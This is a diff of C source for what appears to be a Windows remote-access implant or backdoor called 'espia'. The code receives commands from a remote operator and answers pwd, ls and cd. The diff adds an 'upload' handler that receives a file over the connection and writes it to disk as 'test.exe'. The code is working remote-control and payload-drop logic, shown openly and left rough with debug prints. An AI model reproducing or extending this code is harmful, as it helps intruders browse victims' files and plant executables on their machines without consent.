@@ -38,6 +38,7 @@ int main() {
         memset(cmd_buff, 0, BUFF_SIZE);
         cmd_arg = NULL;
         cmd_size = espia_recv(recv_buff, BUFF_SIZE);
+        printf("Recieved: %s\n", recv_buff);
         //memset(recv_buff + cmd_size - 1, 0, 1);                     // Remove the breakline char ('\n')
 
         /* Seperate the command from argument using the whitespace (' ') */
@@ -63,17 +64,64 @@ int main() {
             StringCbCatW(pwd_buff, sizeof(pwd_buff), L"\n");
             espia_send(pwd_buff, wcslen(pwd_buff)*sizeof(WCHAR));
         } else if (strcmp(cmd_buff, "ls") == 0) {
+            printf("came asdf");
             ls(espia_send);
         } else if (strcmp(cmd_buff, "cd") == 0) {
             WCHAR err_buff[50];
             if (cd(cmd_arg, err_buff, sizeof(err_buff)) != ESPIA_OK) {
                 espia_send(err_buff, wcslen(err_buff)*sizeof(WCHAR));
             }
+        } else if (strcmp(cmd_buff, "upload") == 0) {
+            WCHAR send_buff[9] = L"\0";
+            CHAR write_file_buff[1024] = "\0";
+            espia_recv(write_file_buff, sizeof(write_file_buff));
+            int sum = 0, dig = 0, pow = strlen(write_file_buff) - 1;
+            for (int i = 0 ; i < strlen(write_file_buff) ; i++) {
+                dig = write_file_buff[i] - '0';
+                for (int j = 0 ; j < pow ; j++)
+                    dig *= 10;
+                sum += dig;
+                pow--;
+            }
+
+            StringCbCatW(send_buff, sizeof(send_buff), L"ack<end>");
+            espia_send(send_buff, sizeof(send_buff));
+
+            HANDLE hFile = CreateFileW(
+                L"test.exe",     // Filename
+                GENERIC_WRITE,          // Desired access
+                FILE_SHARE_READ,        // Share mode
+                NULL,                   // Security attributes
+                CREATE_NEW,             // Creates a new file, only if it doesn't already exist
+                FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
+                NULL);                  // Template file handle
+            DWORD bytesWritten;
+            DWORD sizeWritten = 0;
+            if (hFile == INVALID_HANDLE_VALUE) {
+                // Failed to open/create file
+                return 2;
+            }
+
+            int recieved_bytes = 0, full_bytes = 0;
+            memset(write_file_buff, 0, sizeof(write_file_buff));
+            while (full_bytes != sum) {
+                recieved_bytes = espia_recv(write_file_buff, sizeof(write_file_buff));
+                WriteFile(
+                    hFile,            // Handle to the file
+                    write_file_buff,  // Buffer to write
+                    recieved_bytes,   // Buffer size
+                    NULL,    // Bytes written
+                    nullptr);
+                full_bytes += recieved_bytes;
+                printf("%d\n", full_bytes);
+            }
+            continue;
         } else {
             printf("%s : %d\n", recv_buff, cmd_size);
         }
 
-        WCHAR msg_end[10] = L"\0";
+        WCHAR msg_end[6];
+        memset(msg_end, 0, sizeof(msg_end));
         StringCbCatW(msg_end, sizeof(msg_end), L"<end>");
         espia_send(msg_end, sizeof(msg_end));
     }
